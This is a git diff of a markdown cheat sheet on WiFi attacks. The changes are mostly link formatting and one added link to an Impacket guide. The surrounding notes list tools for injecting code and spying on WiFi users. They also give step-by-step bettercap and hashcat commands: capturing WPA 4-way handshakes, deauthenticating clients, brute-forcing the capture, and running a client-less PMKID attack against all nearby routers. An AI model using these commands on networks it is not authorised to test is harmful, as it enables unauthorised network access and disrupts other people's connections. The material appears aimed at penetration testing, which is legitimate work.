@@ -1,15 +1,18 @@
 # Tools
-- Inject code and spy on wifi users: https://github.com/DanMcInerney/LANs.py
-- Collection of PowerShell network security scripts for system administrators: https://github.com/thom-s/netsec-ps-scripts
+
+- [Beginner's Guide to Impacket Tool kit (Part 1)](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
+- Inject code and spy on wifi users: <https://github.com/DanMcInerney/LANs.py>
+- Collection of PowerShell network security scripts for system administrators: <https://github.com/thom-s/netsec-ps-scripts>
 - [CyberScan: Network's Forensics ToolKit](https://github.com/medbenali/CyberScan)
 
 # BetterCap
 
-Swiss army knife for network attacks and monitoring: https://www.bettercap.org/
+Swiss army knife for network attacks and monitoring: <https://www.bettercap.org/>
 
-> Pwning WPA/WPA2 Networks With Bettercap and the PMKID Client-Less Attack: https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/#.XGRV3mo06jA.twitter
+> Pwning WPA/WPA2 Networks With Bettercap and the PMKID Client-Less Attack: <https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/#.XGRV3mo06jA.twitter>
 
 ## 4 way handshake capture:
+
 ```
 sudo bettercap -iface wlan0
 
@@ -21,28 +24,33 @@ sudo bettercap -iface wlan0
 > set ticker.commands 'clear; wifi.show'
 > ticker on
 ```
+
 ```
 wifi.recon.channel 1
 ```
+
 ```
 wifi.deauth e0:xx:xx:xx:xx:xx
 ```
 
 ## Cracking 4-way handshake
+
 ```
 /path/to/cap2hccapx /root/bettercap-wifi-handshakes.pcap bettercap-wifi-handshakes.hccapx
 /path/to/hashcat -m2500 -a3 -w3 bettercap-wifi-handshakes.hccapx '?d?d?d?d?d?d?d?d'
 ```
 
 ## Client-less PMKID Attack
-> https://hashcat.net/forum/thread-7717.html
->
+
+> <https://hashcat.net/forum/thread-7717.html>
+
 > PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
 
 ```
 # wifi.assoc supports 'all' (or `*`) or a specific BSSID, just like wifi.deauth
 > wifi.assoc all
 ```
+
 All nearby vulnerable routers (and let me reiterate: a lot of them are vulnerable), will start sending you the PMKID, which bettercap will dump to the usual pcap file:
 
 ## PMKID Cracking
